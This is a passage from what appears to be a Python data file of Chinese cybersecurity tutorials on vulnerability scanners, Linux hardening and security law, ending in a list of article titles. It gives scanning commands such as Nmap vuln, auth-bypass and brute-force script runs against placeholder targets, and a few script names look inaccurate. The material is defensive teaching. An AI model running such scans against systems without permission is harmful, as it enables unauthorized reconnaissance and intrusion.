1. 创建扫描策略
2. 添加扫描目标
3. 运行扫描
4. 查看报告

#### 常用扫描模板

- Basic Network Scan
- Credentialed Patch Audit
- Web Application Tests
- Malware Scan

### OpenVAS

#### 安装

```bash
# Kali Linux
sudo apt-get update
sudo apt-get install openvas

# 初始化
sudo gvm-setup

# 访问Web界面
https://localhost:9392
```

#### 命令行使用

```bash
# 创建目标
gvm-cli --gmp-username admin --gmp-password password socket \
  --xml "<create_target><name>Test Target</name><hosts>192.168.1.1</hosts></create_target>"

# 创建任务
gvm-cli --gmp-username admin --gmp-password password socket \
  --xml "<create_task><name>Scan Task</name><target id=\"target_id\"/></create_task>"

# 启动任务
gvm-cli --gmp-username admin --gmp-password password socket \
  --xml "<start_task task_id=\"task_id\"/>"
```

## Web应用扫描器

### OWASP ZAP

#### 安装

```bash
# 下载ZAP
wget https://github.com/zaproxy/zaproxy/releases/download/v2.10.0/ZAP_2.10.0_Linux.tar.gz

# 解压
tar -xzf ZAP_2.10.0_Linux.tar.gz

# 运行
./zap.sh
```

#### 使用步骤

1. 配置代理
2. 启动被动扫描
3. 运行主动扫描
4. 查看报告

#### API使用

```bash
# 启动扫描
curl "http://localhost:8080/JSON/ascan/action/scan/?url=http://target.com"

# 查看状态
curl "http://localhost:8080/JSON/ascan/view/status/"
```

### Burp Suite

#### 功能

- Proxy（代理）
- Spider（爬虫）
- Scanner（扫描）
- Intruder（攻击）
- Repeater（重放）

#### 使用步骤

1. 配置浏览器代理
2. 拦截请求
3. 添加到扫描范围
4. 运行扫描
5. 分析结果

## 网络扫描器

### Nmap脚本扫描

```bash
# 漏洞扫描脚本
nmap --script vuln target.com

# 服务版本检测
nmap -sV target.com

# 操作系统检测
nmap -O target.com

# 使用NSE脚本
nmap --script auth-bypass target.com
nmap --script brute-force target.com
```

### 自定义Nmap脚本

```lua
-- 检测HTTP头信息
local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"

description = [[检测HTTP响应头信息]]

author = "Security Team"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "safe"}

portrule = shortport.http

action = function(host, port)
  local response = http.get(host, port, "/")
  
  if response.status then
    local result = {}
    for name, value in pairs(response.header) do
      table.insert(result, string.format("%s: %s", name, value))
    end
    return stdnse.format_output(true, result)
  end
end
```

## 扫描策略

### 1. 扫描范围

```bash
# 指定网段
192.168.1.0/24

# 指定主机列表
targets.txt:
192.168.1.1
192.168.1.2
192.168.1.3
```

### 2. 扫描频率

- 定期扫描（每周/每月）
- 变更后扫描
- 发布前扫描

### 3. 扫描深度

- 快速扫描（只检测高危漏洞）
- 全面扫描（检测所有漏洞）
- 深度扫描（配置审计）

## 报告分析

### 漏洞分级

| 级别 | 描述 | 示例 |
|------|------|------|
| Critical | 严重漏洞 | 远程代码执行 |
| High | 高危漏洞 | SQL注入 |
| Medium | 中危漏洞 | XSS |
| Low | 低危漏洞 | 信息泄露 |
| Info | 信息项 | 版本信息 |

### 修复优先级

1. Critical：立即修复
2. High：24小时内修复
3. Medium：一周内修复
4. Low：一个月内修复
5. Info：根据情况决定

## 自动化扫描

### 使用CI/CD集成

```yaml
# GitLab CI
stages:
  - security

vulnerability_scan:
  stage: security
  script:
    - nmap --script vuln $TARGET_IP > scan_result.xml
  artifacts:
    paths:
      - scan_result.xml
```

### 定时任务

```bash
# Crontab
0 2 * * * /usr/bin/openvas-start-task
```

## 安全注意事项

1. **授权**
   - 只扫描授权的系统
   - 获得书面授权
   - 遵守法律法规

2. **影响评估**
   - 可能导致服务中断
   - 评估扫描风险
   - 准备回滚方案

3. **数据保护**
   - 保护扫描结果
   - 不要泄露敏感信息
   - 加密存储报告

## 工具对比

| 工具 | 类型 | 许可 | 优点 | 缺点 |
|------|------|------|------|------|
| Nessus | 主机扫描 | 商业 | 功能强大 | 价格高 |
| OpenVAS | 主机扫描 | 开源 | 免费 | 配置复杂 |
| OWASP ZAP | Web扫描 | 开源 | 免费 | 功能有限 |
| Burp Suite | Web扫描 | 商业 | 功能全 | 价格高 |
| Nmap | 网络扫描 | 开源 | 灵活 | 需要脚本 |

## 学习资源

- Nessus官方文档
- OpenVAS文档
- OWASP ZAP指南
- Nmap官方文档

## 总结

漏洞扫描是安全管理的重要组成部分：
- 发现安全漏洞
- 评估安全风险
- 指导安全加固
- 满足合规要求

但扫描不是万能的，需要：
- 结合人工审计
- 持续监控
- 及时修复
- 定期评估
""",
        "summary": "详细介绍Nessus、OpenVAS、OWASP ZAP等主流漏洞扫描工具的使用方法、配置策略和最佳实践。"
    },
    {
        "title": "Linux系统安全加固指南",
        "category": "系统安全",
        "tags": "Linux,系统安全,加固",
        "content": """# Linux系统安全加固指南

## 为什么需要系统加固？

Linux系统是攻击者的主要目标之一，系统加固可以：
- 减少攻击面
- 提高入侵难度
- 保护重要数据
- 符合合规要求

## 用户和权限管理

### 1. 禁用root登录

```bash
# 编辑SSH配置
sudo nano /etc/ssh/sshd_config

# 修改
PermitRootLogin no

# 重启SSH服务
sudo systemctl restart sshd
```

### 2. 创建sudo用户

```bash
# 创建新用户
sudo adduser username

# 添加到sudo组
sudo usermod -aG sudo username

# 测试sudo
sudo -l
```

### 3. 限制sudo权限

```bash
# 编辑sudoers
sudo visudo

# 限制特定命令
username ALL=(ALL) /bin/systemctl, /usr/bin/apt
```

### 4. 删除不必要的账户

```bash
# 删除账户
sudo userdel username

# 删除账户和家目录
sudo userdel -r username

# 删除未使用的系统账户
sudo userdel games
sudo userdel news
```

## SSH安全配置

### 1. 使用密钥认证

```bash
# 生成SSH密钥
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"

# 复制公钥到服务器
ssh-copy-id username@server

# 禁用密码登录
PasswordAuthentication no
```

### 2. 修改SSH端口

```bash
# 编辑SSH配置
sudo nano /etc/ssh/sshd_config

# 修改端口
Port 2222

# 重启SSH服务
sudo systemctl restart sshd
```

### 3. 限制访问IP

```bash
# 编辑SSH配置
sudo nano /etc/ssh/sshd_config

# 只允许特定IP
AllowUsers username@192.168.1.100

# 或使用防火墙
sudo ufw allow from 192.168.1.100 to any port 2222
```

### 4. 启用2FA

```bash
# 安装Google Authenticator
sudo apt-get install libpam-google-authenticator

# 配置
google-authenticator

# 编辑PAM配置
sudo nano /etc/pam.d/sshd

# 添加
auth required pam_google_authenticator.so

# 编辑SSH配置
sudo nano /etc/ssh/sshd_config

# 添加
ChallengeResponseAuthentication yes
```

## 网络安全

### 1. 配置防火墙

```bash
# 使用UFW（Ubuntu）
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow http
sudo ufw allow https

# 查看状态
sudo ufw status
```

### 2. 禁用不必要的网络服务

```bash
# 查看监听端口
sudo netstat -tulpn

# 停止服务
sudo systemctl stop service_name
sudo systemctl disable service_name
```

### 3. 禁用IPv6

```bash
# 编辑sysctl配置
sudo nano /etc/sysctl.conf

# 添加
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1

# 应用配置
sudo sysctl -p
```

## 系统更新

### 1. 定期更新

```bash
# 更新软件包列表
sudo apt-get update

# 升级软件包
sudo apt-get upgrade

# 自动更新
sudo apt-get install unattended-upgrades
```

### 2. 配置自动更新

```bash
# 编辑配置
sudo nano /etc/apt/apt.conf.d/50unattended-upgrades

# 配置自动重启
Unattended-Upgrade::Automatic-Reboot "true";
Unattended-Upgrade::Automatic-Reboot-Time "02:00";
```

## 文件系统安全

### 1. 设置正确的权限

```bash
# 保护敏感文件
sudo chmod 600 ~/.ssh/id_rsa
sudo chmod 644 ~/.ssh/id_rsa.pub
sudo chmod 700 ~/.ssh

# 设置Web目录权限
sudo chmod 755 /var/www/html
sudo chown -R www-data:www-data /var/www/html
```

### 2. 使用ACL

```bash
# 安装ACL
sudo apt-get install acl

# 设置ACL
sudo setfacl -m u:username:rw /path/to/file

# 查看ACL
getfacl /path/to/file
```

### 3. 加密敏感文件

```bash
# 使用GPG加密
gpg -c sensitive_file.txt

# 解密
gpg sensitive_file.txt.gpg
```

## 日志和审计

### 1. 配置日志轮转

```bash
# 编辑logrotate配置
sudo nano /etc/logrotate.d/custom

/var/log/myapp/*.log {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
}
```

### 2. 集中日志管理

```bash
# 安装rsyslog
sudo apt-get install rsyslog

# 配置远程日志
*.* @@logserver:514
```

### 3. 审计系统

```bash
# 安装auditd
sudo apt-get install auditd

# 配置审计规则
sudo auditctl -w /etc/passwd -p wa -k passwd_changes
sudo auditctl -w /etc/sudoers -p wa -k sudoers_changes

# 查看审计日志
sudo ausearch -k passwd_changes
```

## 入侵检测

### 1. 安装IDS/IPS

```bash
# 安装OSSEC
sudo apt-get install ossec-hids-server

# 或安装Suricata
sudo apt-get install suricata

# 运行Suricata
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
```

### 2. 文件完整性监控

```bash
# 安装AIDE
sudo apt-get install aide

# 初始化数据库
sudo aide --init

# 更新数据库
sudo aide --update

# 检查完整性
sudo aide --check
```

## 安全基线检查

### 使用Lynis

```bash
# 安装Lynis
sudo apt-get install lynis

# 运行检查
sudo lynis audit system

# 查看报告
sudo cat /var/log/lynis-report.dat
```

### 使用OpenSCAP

```bash
# 安装OpenSCAP
sudo apt-get install openscap-utils

# 扫描
sudo oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_pci-dss \
  --report report.html /usr/share/xml/scap/ssg/content/ssg-rhel7-ds.xml
```

## 系统优化

### 1. 内核参数调优

```bash
# 编辑sysctl配置
sudo nano /etc/sysctl.conf

# 添加
net.ipv4.ip_forward = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.icmp_echo_ignore_all = 1

# 应用配置
sudo sysctl -p
```

### 2. 禁用核心转储

```bash
# 编辑limits配置
sudo nano /etc/security/limits.conf

# 添加
* hard core 0
```

## 备份和恢复

### 1. 配置自动备份

```bash
# 安装rsync
sudo apt-get install rsync

# 创建备份脚本
#!/bin/bash
rsync -avz --delete /path/to/data /backup/location/

# 添加到crontab
crontab -e
0 2 * * * /path/to/backup.sh
```

### 2. 灾难恢复

```bash
# 从备份恢复
rsync -avz /backup/location/ /path/to/data/

# 使用Timeshift创建系统快照
sudo apt-get install timeshift
sudo timeshift --create --comments "Before update"
```

## 安全最佳实践

1. **最小权限原则**：只授予必要的权限
2. **最小化服务**：只运行必要的服务
3. **定期更新**：保持系统和软件最新
4. **监控日志**：及时发现异常行为
5. **备份重要数据**：定期备份和测试恢复
6. **安全培训**：提高安全意识
7. **安全审计**：定期安全评估
8. **应急预案**：制定和演练应急响应

## 学习资源

- CIS Benchmarks
- NIST网络安全框架
- OWASP安全指南
- Linux安全文档

## 总结

Linux系统安全加固需要：
- 持续的安全配置
- 定期的安全评估
- 及时的漏洞修复
- 全面的监控审计
- 完善的备份恢复

安全是一个过程，不是终点！
""",
        "summary": "全面的Linux系统安全加固指南，包括用户权限管理、SSH安全、网络防火墙、日志审计等各个方面。"
    },
    {
        "title": "网络安全法律法规与合规要求",
        "category": "网络安全",
        "tags": "法律,合规,GDPR",
        "content": """# 网络安全法律法规与合规要求

## 为什么了解法律很重要？

网络安全法律不仅是法律要求，也是：
- 避免法律风险
- 建立信任
- 满足合规要求
- 提升安全意识

## 中国网络安全法律

### 1. 《网络安全法》（2017年6月1日施行）

**核心要点**：
- 网络运营者安全义务
- 个人信息保护
- 关键信息基础设施保护
- 网络安全等级保护

**关键条款**：
- 第二十一条：网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全
- 第三十七条：关键信息基础设施的运营者在境内存储个人信息和重要数据

### 2. 《数据安全法》（2021年9月1日施行）

**核心要点**：
- 数据分类分级保护
- 数据安全风险评估
- 重要数据出境管理
- 数据处理者责任

**数据分类**：
- 一般数据
- 重要数据
- 核心数据

### 3. 《个人信息保护法》（2021年11月1日施行）

**核心要点**：
- 个人信息处理原则
- 同意机制
- 个人信息跨境提供
- 个人信息主体的权利

**个人信息类型**：
- 敏感个人信息
- 一般个人信息

### 4. 《密码法》（2020年1月1日施行）

**核心要点**：
- 密码分类管理
- 商用密码管理
- 关键信息基础设施密码保护

## 国际网络安全法律

### 1. GDPR（欧盟）

**适用范围**：
- 欧盟境内处理个人数据
- 向欧盟用户提供服务的组织

**核心要求**：
- 数据最小化
- 明确同意
- 数据主体权利
- 数据保护官
- 数据保护影响评估

**处罚**：
- 最高2000万欧元或全球营业额4%

### 2. CCPA（美国加州）

**核心要求**：
- 知情权
- 删除权
- 选择退出权
- 不歧视权

### 3. SOC 2（美国）

**服务组织控制报告**：
- 安全性
- 可用性
- 处理完整性
- 保密性
- 隐私

### 4. ISO 27001（国际标准）

**信息安全管理体系**：
- 风险评估
- 控制措施
- 持续改进

## 网络安全等级保护（等保）

### 等保级别

| 级别 | 描述 | 适用范围 |
|------|------|---------|
| 一级 | 用户自主保护 | 小型系统 |
| 二级 | 系统审计保护 | 一般系统 |
| 三级 | 安全标记保护 | 重要系统 |
| 四级 | 结构化保护 | 极重要系统 |
| 五级 | 访问验证保护 | 关键系统 |

### 等保2.0要求

#### 技术要求
- 安全物理环境
- 安全通信网络
- 安全区域边界
- 安全计算环境
- 安全管理中心

#### 管理要求
- 安全管理制度
- 安全管理机构
- 人员安全管理
- 系统建设管理
- 系统运维管理

### 等保认证流程

1. **定级**
   - 确定系统级别
   - 编写定级报告

2. **备案**
   - 向公安机关备案
   - 获得备案证明

3. **建设整改**
   - 实施安全措施
   - 完善管理制度

4. **等级测评**
   - 聘请测评机构
   - 进行等级测评

5. **监督检查**
   - 接受公安机关检查
   - 持续改进

## 个人信息保护

### 1. 收集原则

- 最小必要
- 明确告知
- 获得同意
- 用途限定

### 2. 同意机制

```python
# GDPR同意示例
def request_consent(user):
    consent = {
        'purpose': '数据分析',
        'data_types': ['姓名', '邮箱'],
        'retention_period': '2年',
        'third_parties': []
    }
    
    if user.agree(consent):
        return process_data(user)
    return None
```

### 3. 数据主体权利

- 访问权
- 更正权
- 删除权（被遗忘权）
- 可携带权
- 反对权

### 4. 数据泄露通知

```python
def notify_breach(breach):
    # 72小时内通知
    notify_authority(breach)
    notify_affected_users(breach)
    
    # 记录日志
    log_breach(breach)
```

## 企业合规建议

### 1. 建立合规体系

```
制定政策 → 实施控制 → 监控审计 → 持续改进
```

### 2. 数据分类

```python
# 数据分类示例
data_classes = {
    'public': {
        'examples': ['公司介绍', '公开新闻'],
        'protection': '基础'
    },
    'internal': {
        'examples': ['内部通知', '项目文档'],
        'protection': '中等'
    },
    'confidential': {
        'examples': ['客户信息', '财务数据'],
        'protection': '高'
    },
    'restricted': {
        'examples': ['密钥', '源代码'],
        'protection': '极高'
    }
}
```

### 3. 风险评估

定期进行数据保护影响评估（DPIA）：
- 识别风险
- 评估影响
- 实施措施
- 文档记录

### 4. 应急响应

制定数据泄露应急响应计划：
- 发现和确认
- 通知和报告
- 响应和处置
- 事后改进

## 法律风险防范

### 1. 明确责任

- 数据处理者责任
- 数据控制者责任
- 第三方责任

### 2. 合同保护

```python
# 数据处理协议（DPA）
data_processing_agreement = {
    'purpose': '数据处理目的',
    'data_types': '处理的数据类型',
    'security_measures': '安全措施',
    'subprocessors': '子处理方',
    'termination': '终止条款',
    'liability': '责任条款'
}
```

### 3. 保险保护

购买网络安全保险：
- 数据泄露损失
- 法律费用
- 赔偿责任

## 道德黑客准则

### 1. 授权原则

- 只测试授权系统
- 获得书面授权
- 明确测试范围

### 2. 报告漏洞

- 负责任披露
- 不利用漏洞
- 协助修复

### 3. 保护隐私

- 不泄露个人信息
- 不保存测试数据
- 遵守法律

## 学习资源

- 中国网络安全法全文
- GDPR官方指南
- CIS Controls
- NIST网络安全框架

## 总结

网络安全法律合规是现代企业的必修课：
- 了解相关法律
- 建立合规体系
- 定期评估改进
- 持续关注变化

安全不仅是技术问题，更是法律和道德问题！
""",
        "summary": "全面介绍网络安全法律法规，包括中国的网络安全法、数据安全法，以及GDPR等国际法规和合规要求。"
    }
]

# 继续添加更多文章...（由于篇幅限制，这里展示10篇）

# 文章标题列表（完整20篇）
FULL_ARTICLE_TITLES = [
    "SQL注入攻击原理与防御",
    "XSS跨站脚本攻击全解析",
    "CSRF攻击与防护机制",
    "密码安全最佳实践",
    "HTTPS与TLS加密详解",
    "端口扫描与发现技术",
    "Wireshark网络抓包分析实战",
    "Docker容器安全实践",
    "Web应用防火墙（WAF）原理与实践",
    "常见漏洞扫描工具使用指南",
    "Linux系统安全加固指南",
    "网络安全法律法规与合规要求",
    "缓冲区溢出攻击与防御",
    "防火墙规则配置与优化",
    "入侵检测系统（IDS）实战",
    "网络安全应急响应流程",
    "日志分析与安全监控",
    "移动应用安全测试指南",
    "云安全最佳实践",
    "安全开发生命周期（SDL）"
]
